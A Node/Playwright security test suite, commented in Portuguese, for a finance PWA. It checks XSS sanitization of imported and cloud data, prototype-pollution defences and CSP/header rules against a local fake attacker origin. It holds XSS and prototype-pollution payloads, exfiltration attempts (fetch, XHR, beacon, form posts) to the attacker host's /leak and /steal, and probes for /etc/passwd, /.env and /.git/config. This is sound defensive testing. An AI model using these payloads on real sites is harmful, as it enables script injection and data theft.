// ATAQUE 1 e 2: XSS/injecao por dados de backup e da nuvem + CSP/cabecalhos. Navegador real (Chromium), origem atacante local,
// Supabase FALSO (rota interceptada; nada sai para a internet). Reexecutar: node --test tests/seguranca-xss-csp.test.mjs
import test from 'node:test';
import assert from 'node:assert/strict';
import { writeFileSync, mkdtempSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { HEADER_RULES } from '../src/pwa/headers.mjs';
import { seedState } from './helpers/e2e-ui.mjs';
import {
  browserAvailable, buildSite, cleanup, serveSite, serveEvil, launch, attackPage, makeFakeSupabase, headersFor,
  readState, bodyText, flush, seedBlob, STATE_KEY,
} from './helpers/ataque-site.mjs';

const skip = browserAvailable() ? false : 'Chromium ou Playwright nao encontrados';
let dir, site, evil, browser;
test.before(async () => {
  if (skip) return;
  dir = buildSite();
  // sonda same-origin (copia de teste, so no build temporario): um script PERMITIDO tentando eval/new Function/setTimeout(string)
  writeFileSync(join(dir, 'probe.js'), `window.__r = {}; const t = (n, f) => { try { window.__r[n] = f(); } catch (e) { window.__r[n] = 'bloqueado:' + e.name; } };
t('eval', () => { window.eval('window.__pwned="eval"'); return 'executou'; });
t('indirect-eval', () => { (0, eval)('window.__pwned="ieval"'); return 'executou'; });
t('new-function', () => { new Function('window.__pwned="fn"')(); return 'executou'; });
t('setTimeout-string', () => { setTimeout('window.__pwned="st"', 0); return 'agendou'; });
t('setInterval-string', () => { const i = setInterval('window.__pwned="si"', 1); setTimeout(() => clearInterval(i), 50); return 'agendou'; });
t('AsyncFunction', () => { new (Object.getPrototypeOf(async function () {}).constructor)('window.__pwned="af"')(); return 'executou'; });
t('wasm', () => { new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0])); return 'compilou'; });
window.__done = true;`);
  writeFileSync(join(dir, 'probe.html'), '<!doctype html><title>sonda</title><script src="probe.js"></script>');
  site = await serveSite(dir); evil = await serveEvil({ victimUrl: site.url }); browser = await launch();
});
test.after(async () => { if (browser) await browser.close(); if (site) await site.close(); if (evil) await evil.close(); if (dir) cleanup(dir); });

const ICON = '[\\s\\uE000-\\uF8FF]*';
const btn = (page, name) => page.getByRole('button', { name: new RegExp(`^${ICON}${name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}${ICON}$`) });

// ---------- 1. XSS e injecao -----------------------------------------------------------------------------------------
const PAYLOADS = () => {
  const E = evil.url;
  return {
    img: '<img src=x onerror=window.__pwned=1>',
    svg: '"><svg onload=window.__pwned=2>',
    script: '<script>window.__pwned=3</script>',
    js: 'javascript:window.__pwned=4',
    quotes: `"'><b>x</b>&amp;&lt;`,
    css: `red;background:url(${E}/x.png);}</style><style>*{display:none}`,
    iconClass: 'ph-fill fixed inset-0 z-50',
    iconEvil: `ph-fill" onmouseover="window.__pwned=5" x="`,
    big: 'A'.repeat(200000),
  };
};
function evilState(base) {
  const p = PAYLOADS();
  const s = JSON.parse(JSON.stringify(base));
  s.bills = [
    { id: 'b1', name: p.img, icon: p.iconEvil, color: p.css, cat: 'pessoal', v: 100, rec: 'mensal', due: 5, on: true },
    { id: 'b2', name: p.svg, icon: p.iconClass, color: '#12345', cat: p.js, v: 1e308, rec: 'mensal', due: 5, on: true },
    { id: '__proto__', name: 'proto', icon: 'ph-x', color: '#ffffff', v: 1 },
    { id: 'constructor', name: 'ctor', icon: 'ph-x', color: '#ffffff', v: 1 },
    { id: 'b3', name: p.big, icon: p.js, color: p.js, v: -50, rec: p.script, due: 'NaN' },
  ];
  s.sources = [{ k: 'uber', name: p.script, icon: p.js }, { k: 'x__proto__', name: p.quotes, icon: p.iconEvil }, { k: 'uber', name: 'dup', icon: '' }, { k: '<img>', name: 'k', icon: 'ph-x' }];
  s.expCats = [{ name: p.svg, icon: p.iconClass }, { name: p.img, icon: p.js }, { name: p.big, icon: p.css }];
  s.pots = [{ id: 'p1', name: p.img, icon: p.iconEvil, c: p.css, v: 5, goal: 10, kind: p.script }];
  s.exps = [{ id: 'e1', date: '2026-10-20', time: '10:00', cat: p.img, icon: p.iconEvil, v: 1 }];
  s.moves = [{ t: p.img, p: p.svg, v: 1, d: '2026-10-20' }];
  return s;
}
// JSON com chaves __proto__ / constructor PROPRIAS (JSON.stringify nao as cria; o JSON.parse do app cria)
const inject = (text, key, entries) => text.replace(new RegExp(`"${key}":\\{(\\}?)`), (m, close) => `"${key}":{${entries}${close ? '}' : ','}`);
const withProtoKeys = obj => inject(inject(JSON.stringify(obj).replace(/^\{/, '{"__proto__":{"polluted":"sim"},"constructor":{"prototype":{"polluted2":"sim"}},'),
  'paid', '"__proto__:2026-10-20":1,"constructor:2026-10-20":1'), 'recs', '"__proto__":{"closed":true}');

async function assertNoExecution(page, label) {
  const snap = await page.evaluate(({ evilPort }) => ({
    pwned: window.__pwned, viol: window.__viol, polluted: ({}).polluted ?? ({}).polluted2 ?? Object.prototype.polluted ?? null,
    handlers: document.querySelectorAll('[onerror],[onload],[onclick],[onmouseover],[onfocus]').length,
    scripts: [...document.querySelectorAll('script')].filter(s => !s.src.startsWith(location.origin)).length,
    badImgs: [...document.images].filter(i => !(i.src.startsWith(location.origin) || i.src.startsWith('data:') || i.src.startsWith('blob:'))).map(i => i.src),
    badStyle: [...document.querySelectorAll('[style]')].filter(e => e.getAttribute('style').includes(evilPort) || /url\(/i.test(e.getAttribute('style'))).map(e => e.getAttribute('style').slice(0, 80)),
    injectedStyle: document.querySelectorAll('style').length,
    badLinks: [...document.querySelectorAll('a[href]')].filter(a => /^javascript:/i.test(a.getAttribute('href'))).length,
    iconClasses: [...document.querySelectorAll('[class]')].filter(e => /\b(fixed|inset-0|z-50)\b/.test(String(e.className)) && getComputedStyle(e).position === 'fixed').length,
  }), { evilPort: new URL(evil.url).port });
  assert.equal(snap.pwned, undefined, `${label}: payload executou (${snap.pwned})`);
  assert.deepEqual(snap.viol, [], `${label}: violacoes de CSP (o app nao deveria nem tentar)`);
  assert.equal(snap.polluted, null, `${label}: Object.prototype poluido`);
  assert.equal(snap.handlers, 0, `${label}: atributo de evento no DOM`);
  assert.equal(snap.scripts, 0, `${label}: <script> externo/injetado`);
  assert.deepEqual(snap.badImgs, [], `${label}: imagem externa`);
  assert.deepEqual(snap.badStyle, [], `${label}: style injetado`);
  assert.equal(snap.injectedStyle, 0, `${label}: <style> injetado`);
  assert.equal(snap.badLinks, 0, `${label}: link javascript:`);
  assert.equal(snap.iconClasses, 0, `${label}: classe vinda do icone mudou o layout (position:fixed)`);
  assert.deepEqual(evil.hits, [], `${label}: o navegador falou com a origem do atacante`);
}
function assertSanitized(s, label) {
  const dump = JSON.stringify(s);
  assert.doesNotMatch(dump, /onmouseover|window\.__pwned=(?!1|2|3)/, `${label}: lixo de atributo sobreviveu`);
  const walk = (o, f) => { if (Array.isArray(o)) o.forEach(x => walk(x, f)); else if (o && typeof o === 'object') for (const [k, v] of Object.entries(o)) { f(k, v); walk(v, f); } };
  walk(s, (k, v) => {
    if (k === 'icon' && v !== '') assert.match(v, /^[a-z0-9 -]+$/, `${label}: icone fora do padrao: ${v}`);
    if (['color'].includes(k)) assert.match(v, /^#[0-9a-fA-F]{6}$/, `${label}: cor fora do padrao: ${v}`);
    if (typeof v === 'string') assert.ok(v.length <= 260, `${label}: string gigante (${v.length}) em ${k}`);
    if (typeof v === 'number') assert.ok(Number.isFinite(v) && Math.abs(v) <= 1e9 + 1, `${label}: numero fora do limite em ${k}: ${v}`);
  });
  assert.ok(!Object.prototype.hasOwnProperty.call(s, '__proto__') && !Object.prototype.hasOwnProperty.call(s, 'constructor'), `${label}: chave perigosa na raiz`);
  for (const b of s.bills) assert.ok(!['__proto__', 'constructor', 'prototype'].includes(b.id), `${label}: id perigoso ${b.id}`);
  assert.ok(!Object.keys(s.paid).some(k => /^(__proto__|constructor)/.test(k)), `${label}: chave paid perigosa`);
  assert.ok(!Object.keys(s.recs).some(k => !/^\d{4}-\d{2}-\d{2}$/.test(k)), `${label}: chave recs perigosa`);
}
const tour = async page => {
  for (const name of ['Contas', 'Início', 'Anotar ganho', 'Anotar gasto']) {
    const d = btn(page, 'Entendi'); if (await d.count()) await d.first().click().catch(() => {});
    const b = btn(page, name); if (await b.count()) { await b.first().click().catch(() => {}); await page.waitForTimeout(250); }
    const v = btn(page, 'Voltar'); if (name.startsWith('Anotar') && await v.count()) await v.first().click().catch(() => {});
  }
};

test('1.1 backup importado com payloads (XSS, javascript:, CSS injection, __proto__, strings gigantes) vira so texto e nunca executa', { skip }, async () => {
  evil.hits.length = 0;
  const context = await browser.newContext({ viewport: { width: 390, height: 844 }, acceptDownloads: true });
  await context.addInitScript(([k, v]) => { if (!localStorage.getItem(k)) localStorage.setItem(k, v); }, [STATE_KEY, seedBlob(seedState())]);
  const { page, errors } = await attackPage(context, { site, evil });
  await page.goto(site.url);
  await page.waitForFunction(() => document.body.innerText.length > 50);
  // abre Conta > Nuvem e importa
  await btn(page, 'Início').first().click().catch(() => {});
  await page.getByRole('button', { name: /Jornada/ }).first().click();
  const d = btn(page, 'Entendi'); if (await d.count()) await d.first().click();
  await page.getByRole('button', { name: /Nuvem, backup e assinatura/ }).click();
  const file = join(mkdtempSync(join(tmpdir(), 'faro-bkp-')), 'evil.json');
  const raw = withProtoKeys({ app: 'FARO', version: 2, exportedAt: new Date().toISOString(), data: evilState(seedState()) });
  assert.ok(raw.length < 5e6, 'o backup de teste precisa caber no limite de 5 MB do app');
  writeFileSync(file, raw);
  await page.locator('input[type=file]').setInputFiles(file);
  await page.waitForFunction(() => /Backup restaurado|não|Nao/.test(document.body.innerText));
  assert.match(await bodyText(page), /Backup restaurado/, 'o backup malicioso (valido no formato) deveria ser aceito e saneado');
  await flush(page);
  assertSanitized(await readState(page), 'import');
  await tour(page);
  // o texto do payload aparece como TEXTO (o nome cabe em 60 caracteres e fica literal), nunca como elemento
  await btn(page, 'Início').first().click().catch(() => {});
  await btn(page, 'Contas').first().click().catch(() => {});
  const seen = await bodyText(page);
  assert.ok(seen.includes('<img src=x onerror=window.__pwned=1>') || seen.includes('<script>'), 'sanidade do teste: o nome malicioso precisa aparecer como TEXTO na tela (senao o teste nao exercitou a renderizacao)');
  await assertNoExecution(page, 'import');
  assert.ok(!site.log.some(l => /GET \/x(\?|$)/.test(l)), 'a pagina tentou carregar /x do <img src=x> injetado');
  assert.deepEqual(errors, [], errors.join('\n'));
  await context.close();
});

test('1.1b (endurecimento, baixa) o icone deveria aceitar so classes Phosphor, nao qualquer [a-z0-9 -]', { todo: 'baixa: icon() em src/core/state.js aceita qualquer classe; inerte hoje (app.css so tem .ph*, .fscroll, .hscroll), mas vira vetor se alguem adicionar utilitarios CSS' }, async () => {
  const { normalizeState } = await import('../src/core/state.js');
  const s = normalizeState({ schemaVersion: 2, expCats: [{ name: 'a', icon: 'fixed inset-0 z-50 hscroll' }] });
  assert.match(s.expCats[0].icon, /^(ph(-[a-z]+)? )?ph-[a-z0-9-]+$|^$/, `icone aceito: ${s.expCats[0].icon}`);
});

test('1.2 estado vindo da NUVEM (replaceState) com os mesmos payloads: saneado e inerte', { skip }, async () => {
  evil.hits.length = 0;
  const fake = makeFakeSupabase();
  const uid = fake.addUser('vitima@exemplo.com', 'senha-forte-1', 'u-vitima');
  fake.states.set(uid, { schema_version: 2, revision: 4, state: JSON.parse(withProtoKeys(evilState(seedState()))), device_id: 'outro', last_mutation_id: 'm0', server_updated_at: new Date().toISOString() });
  const context = await browser.newContext({ viewport: { width: 390, height: 844 } });
  const { page, errors } = await attackPage(context, { site, evil, fake });
  await page.goto(site.url);
  await page.getByRole('button', { name: /Já uso o Faro/ }).click();
  await page.getByLabel('E-mail').fill('vitima@exemplo.com');
  await page.getByLabel('Senha').fill('senha-forte-1');
  await btn(page, 'Entrar').click();
  await page.waitForFunction(() => /Você entrou na conta|Tudo salvo|Escolha quais dados/.test(document.body.innerText), null, { timeout: 15000 });
  await flush(page);
  const s = await readState(page);
  if (s && s.bills) assertSanitized(s, 'nuvem'); // aparelho novo: aplica o da nuvem direto
  await tour(page);
  await assertNoExecution(page, 'nuvem');
  assert.deepEqual(errors, [], errors.join('\n'));
  await context.close();
});

test('1.3 aplicar nuvem apos CONFLITO tambem sanea (caminho do botao "Manter os dados da nuvem")', { skip }, async () => {
  evil.hits.length = 0;
  const fake = makeFakeSupabase();
  const uid = fake.addUser('vitima2@exemplo.com', 'senha-forte-1', 'u-vitima2');
  fake.states.set(uid, { schema_version: 2, revision: 9, state: evilState(seedState()), device_id: 'outro', last_mutation_id: 'm0', server_updated_at: new Date().toISOString() });
  const context = await browser.newContext({ viewport: { width: 390, height: 844 } });
  await context.addInitScript(([k, v]) => { if (!localStorage.getItem(k)) localStorage.setItem(k, v); }, [STATE_KEY, seedBlob(seedState({ closedAgo: [1, 2] }))]);
  const { page, errors } = await attackPage(context, { site, evil, fake });
  await page.goto(site.url);
  await page.getByRole('button', { name: /Jornada/ }).first().click();
  const d = btn(page, 'Entendi'); if (await d.count()) await d.first().click();
  await page.getByRole('button', { name: /Nuvem, backup e assinatura/ }).click();
  await page.getByLabel('E-mail').fill('vitima2@exemplo.com');
  await page.getByLabel('Senha').fill('senha-forte-1');
  await btn(page, 'Entrar').click();
  await page.waitForFunction(() => /Escolha quais dados manter/.test(document.body.innerText), null, { timeout: 15000 });
  await assertNoExecution(page, 'conflito (tela de comparacao)'); // a tela mostra um RESUMO do estado remoto nao saneado
  await btn(page, 'Manter os dados da nuvem').click();
  await btn(page, 'Confirmar').click();
  await page.waitForFunction(() => /Dados da nuvem mantidos/.test(document.body.innerText));
  await flush(page);
  assertSanitized(await readState(page), 'nuvem-conflito');
  await tour(page);
  await assertNoExecution(page, 'nuvem-conflito');
  assert.deepEqual(errors, [], errors.join('\n'));
  await context.close();
});

// ---------- 2. CSP e cabecalhos ---------------------------------------------------------------------------------------
test('2.1 CSP: sem unsafe-inline/unsafe-eval/curinga, frame-ancestors/base-uri/object-src none, connect-src so Supabase do projeto', () => {
  const csp = headersFor(site.rules, '/')['Content-Security-Policy'];
  assert.ok(csp, 'sem CSP');
  const d = Object.fromEntries(csp.split(';').map(x => x.trim()).filter(Boolean).map(x => { const [k, ...v] = x.split(/\s+/); return [k, v]; }));
  for (const k of ['default-src', 'script-src', 'style-src', 'img-src', 'font-src', 'connect-src', 'worker-src', 'manifest-src']) {
    assert.ok(d[k], `diretiva ${k} ausente`);
    for (const bad of ["'unsafe-inline'", "'unsafe-eval'", "'unsafe-hashes'", '*', 'http:', 'https:', "'wasm-unsafe-eval'", "'strict-dynamic'"]) assert.ok(!d[k].includes(bad), `${k} permite ${bad}`);
  }
  assert.deepEqual(d['script-src'], ["'self'"]);
  assert.deepEqual(d['style-src'], ["'self'"]);
  assert.deepEqual(d['frame-ancestors'], ["'none'"]);
  assert.deepEqual(d['base-uri'], ["'none'"]);
  assert.deepEqual(d['object-src'], ["'none'"]);
  assert.deepEqual(d['frame-src'], ["'none'"]);
  assert.deepEqual(d['form-action'], ["'self'"]);
  assert.deepEqual(d['connect-src'].filter(x => x !== "'self'"), ['https://mjbyqhreptllilkggiri.supabase.co', 'wss://mjbyqhreptllilkggiri.supabase.co']);
  assert.ok(d['img-src'].every(x => ["'self'", 'data:', 'blob:'].includes(x)));
});

test('2.2 cabecalhos de seguranca em TODAS as rotas (inclusive 404, SPA fallback, sw.js, fontes, manifest)', async () => {
  const fontFile = readFileSync(join(dir, '_headers'), 'utf8') && (await import('node:fs')).readdirSync(join(dir, 'assets/fonts'))[0];
  const rotas = ['/', '/index.html', '/app.js', '/app.css', '/sw.js', '/manifest.webmanifest', '/icon.svg', `/assets/fonts/${fontFile}`, '/assets/platforms/faro-platform-uber.svg', '/icons/icon-192.png',
    '/nao-existe', '/nao-existe.png', '/a/b/c/d', '/%00', '/..%2f..%2fetc/passwd', '/sw.js/', '/.env', '/.git/config', '/_headers', '/package.json'];
  const want = HEADER_RULES.find(r => r.path === '/*').headers;
  for (const r of rotas) {
    const res = await fetch(site.origin + r, { headers: { 'sec-fetch-mode': 'navigate' } });
    for (const [k, v] of Object.entries(want)) assert.equal(res.headers.get(k), v, `${r} (${res.status}): cabecalho ${k} ausente/diferente`);
    const body = await res.text();
    assert.ok(!/SUPABASE_SERVICE|sk_live|service_role/i.test(body), `${r}: segredo na resposta`);
  }
  assert.equal((await fetch(site.origin + '/_headers')).status, 404, '_headers nao pode ser servido como arquivo');
  assert.equal((await fetch(site.origin + '/.env')).status, 404);
  const sw = await fetch(site.origin + '/sw.js');
  assert.match(sw.headers.get('cache-control'), /no-store/);
  assert.equal(sw.headers.get('service-worker-allowed'), '/');
  assert.match(sw.headers.get('content-type'), /javascript/);
});

test('2.3 HSTS, nosniff, referrer e permissions-policy com valores fortes', () => {
  const h = headersFor(site.rules, '/qualquer');
  assert.ok(/max-age=(\d+)/.exec(h['Strict-Transport-Security']) && Number(/max-age=(\d+)/.exec(h['Strict-Transport-Security'])[1]) >= 31536000);
  assert.match(h['Strict-Transport-Security'], /includeSubDomains/);
  assert.equal(h['X-Content-Type-Options'], 'nosniff');
  assert.match(h['Referrer-Policy'], /^(no-referrer|same-origin|strict-origin|strict-origin-when-cross-origin)$/);
  for (const f of ['camera', 'microphone', 'geolocation', 'payment', 'usb']) assert.match(h['Permissions-Policy'], new RegExp(`${f}=\\(\\)`));
});

test('2.4 CSP bloqueia script/estilo/imagem/iframe/fonte/fetch/form/base/eval/worker de origem externa', { skip }, async () => {
  evil.hits.length = 0;
  const context = await browser.newContext({ viewport: { width: 390, height: 844 } });
  const { page } = await attackPage(context, { site, evil });
  await page.goto(site.url);
  await page.waitForFunction(() => document.body.innerText.length > 20);
  const E = evil.url;
  const out = await page.evaluate(async E => {
    const r = {}; const add = (el, parent = document.body) => parent.appendChild(el);
    const wait = ms => new Promise(x => setTimeout(x, ms));
    const t = async (name, fn) => { try { r[name] = await fn(); } catch (e) { r[name] = `erro:${e && e.name}`; } };
    await t('script-externo', () => { const s = document.createElement('script'); s.src = `${E}/evil.js`; add(s); });
    await t('script-inline', () => { const s = document.createElement('script'); s.textContent = 'window.__pwned="inline"'; add(s); });
    await t('script-data', () => { const s = document.createElement('script'); s.src = 'data:text/javascript,window.__pwned="data"'; add(s); });
    await t('handler-inline', () => { const i = document.createElement('div'); i.innerHTML = '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="window.__pwned=\'onload\'">'; add(i); });
    await t('javascript-url', () => { const a = document.createElement('a'); a.href = 'javascript:window.__pwned="jsurl"'; add(a); a.click(); });
    await t('import-dinamico', () => import(`${E}/evil.js`).then(() => 'importou', () => 'bloqueado'));
    await t('css-externo', () => { const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = `${E}/evil.css`; add(l, document.head); });
    await t('style-inline', () => { const s = document.createElement('style'); s.textContent = 'body{background:red}'; add(s, document.head); });
    await t('style-attr', () => { const d = document.createElement('div'); d.setAttribute('style', `background:url(${E}/x.png)`); add(d); });
    await t('img-externa', () => { const i = document.createElement('img'); i.src = `${E}/x.png`; add(i); });
    await t('iframe-externo', () => { const f = document.createElement('iframe'); f.src = `${E}/frame.html`; add(f); });
    await t('iframe-srcdoc', () => { const f = document.createElement('iframe'); f.srcdoc = '<script>parent.__pwned="srcdoc"<\/script>'; add(f); });
    await t('object', () => { const o = document.createElement('object'); o.data = `${E}/x.png`; add(o); });
    await t('embed', () => { const o = document.createElement('embed'); o.src = `${E}/x.png`; add(o); });
    await t('fonte', () => new FontFace('x', `url(${E}/f.woff2)`).load().then(() => 'carregou', () => 'bloqueado'));
    await t('fetch', () => fetch(`${E}/leak?d=1`, { mode: 'no-cors' }).then(() => 'enviou', () => 'bloqueado'));
    await t('xhr', () => new Promise(res => { const x = new XMLHttpRequest(); x.open('POST', `${E}/leak`); x.onerror = () => res('bloqueado'); x.onload = () => res('enviou'); x.send('a=1'); }));
    await t('beacon', () => (navigator.sendBeacon(`${E}/beacon`, 'x') ? 'enviou' : 'bloqueado'));
    await t('websocket', () => new Promise(res => { const w = new WebSocket(E.replace('http', 'ws') + '/ws'); w.onerror = () => res('bloqueado'); w.onopen = () => res('abriu'); }));
    await t('eventsource', () => new Promise(res => { const e = new EventSource(`${E}/es`); e.onerror = () => res('bloqueado'); e.onopen = () => res('abriu'); }));
    await t('form-externo', () => { const f = document.createElement('form'); f.action = `${E}/steal`; f.method = 'POST'; f.target = '_blank'; add(f); f.submit(); });
    await t('base-tag', () => { const b = document.createElement('base'); b.href = `${E}/`; add(b, document.head); return document.baseURI.startsWith(E) ? 'trocou-base' : 'base-intacta'; });
    await t('worker-externo', () => { new Worker(`${E}/evil.js`); });
    await t('worker-blob', () => { new Worker(URL.createObjectURL(new Blob(['self.postMessage(1)']))); });
    await t('meta-csp-relax', () => { const m = document.createElement('meta'); m.httpEquiv = 'Content-Security-Policy'; m.content = "script-src 'unsafe-inline'"; add(m, document.head); const s = document.createElement('script'); s.textContent = 'window.__pwned="meta"'; add(s); });
    await wait(600);
    return r;
  }, E);
  await page.waitForTimeout(500);
  const viol = await page.evaluate(() => window.__viol); const pwned = await page.evaluate(() => window.__pwned);
  assert.equal(pwned, undefined, `algo executou: ${pwned}`);
  assert.equal(out['import-dinamico'], 'bloqueado');
  for (const k of ['fonte', 'fetch', 'xhr', 'websocket', 'eventsource']) assert.equal(out[k], 'bloqueado', `${k}: ${out[k]} | ${JSON.stringify(out)}`);
  // sendBeacon devolve true ao ENFILEIRAR; quem prova o bloqueio e a origem do atacante nao ter recebido nada (abaixo)
  assert.equal(out['base-tag'], 'base-intacta');
  assert.deepEqual(evil.hits, [], `a origem do atacante recebeu pedidos: ${evil.hits.join(' | ')}`);
  const joined = viol.join('\n');
  for (const d of [/script-src-elem/, /script-src-attr|script-src/, /style-src-elem/, /style-src-attr|style-src/, /img-src/, /frame-src/, /font-src/, /connect-src/, /form-action/, /base-uri/, /object-src/, /worker-src|script-src/]) assert.match(joined, d, `faltou violacao esperada ${d}`);
  await context.close();
});

test('2.4b CSP: eval, new Function, setTimeout(string) e AsyncFunction bloqueados ate para script same-origin', { skip }, async () => {
  const context = await browser.newContext();
  const { page } = await attackPage(context, { site, evil });
  await page.goto(site.url + 'probe.html');
  await page.waitForFunction(() => window.__done === true);
  await page.waitForTimeout(200);
  const r = await page.evaluate(() => ({ r: window.__r, pwned: window.__pwned, viol: window.__viol }));
  assert.equal(r.pwned, undefined, `executou: ${r.pwned}`);
  for (const k of ['eval', 'indirect-eval', 'new-function', 'AsyncFunction']) assert.match(r.r[k], /^bloqueado:EvalError/, `${k}: ${r.r[k]}`);
  assert.match(r.r['wasm'], /^bloqueado/, `wasm: ${r.r['wasm']} (script-src sem wasm-unsafe-eval deve bloquear WebAssembly)`);
  assert.ok(r.viol.some(v => /script-src/.test(v)), 'sem violacao registrada para eval');
  await context.close();
});

test('2.5 clickjacking: o app nao renderiza dentro de iframe de outra origem (frame-ancestors none)', { skip }, async () => {
  evil.hits.length = 0; site.log.length = 0;
  const context = await browser.newContext({ viewport: { width: 500, height: 700 } });
  const page = await context.newPage();
  await page.route('**/*', route => { const u = new URL(route.request().url()); return (u.origin === site.origin || u.origin === evil.url) ? route.continue() : route.abort(); });
  evil.setVictim(site.url);
  await page.goto(`${evil.url}/frame.html`);
  await page.waitForTimeout(1200);
  const frames = page.frames().filter(f => f !== page.mainFrame());
  for (const f of frames) assert.equal(await f.locator('#root').count(), 0, 'o app abriu dentro do iframe do atacante');
  const hasAppJs = site.log.filter(l => l.includes('/app.js'));
  assert.deepEqual(hasAppJs, [], 'o JS do app foi carregado dentro do iframe');
  await context.close();
});

test('2.6 index.html e SVGs publicados nao tem script inline, handlers nem referencias externas', () => {
  const idx = readFileSync(join(dir, 'index.html'), 'utf8');
  assert.doesNotMatch(idx, /<script(?![^>]*\bsrc=)[^>]*>[^<]/i, 'script inline no index.html');
  assert.doesNotMatch(idx, /\son\w+\s*=|javascript:|https?:\/\//i, 'handler/URL externa no index.html');
  for (const f of ['icon.svg', 'assets/platforms/faro-platform-uber.svg', 'assets/platforms/faro-platform-99.svg', 'assets/platforms/faro-platform-indrive.svg', 'icons/maskable.svg']) {
    let svg; try { svg = readFileSync(join(dir, f), 'utf8'); } catch { continue; }
    assert.doesNotMatch(svg, /<script|\son\w+\s*=|javascript:|<foreignObject|xlink:href="https?:|href="https?:\/\/(?!www\.w3\.org)/i, `${f}: SVG ativo/externo`);
  }
});
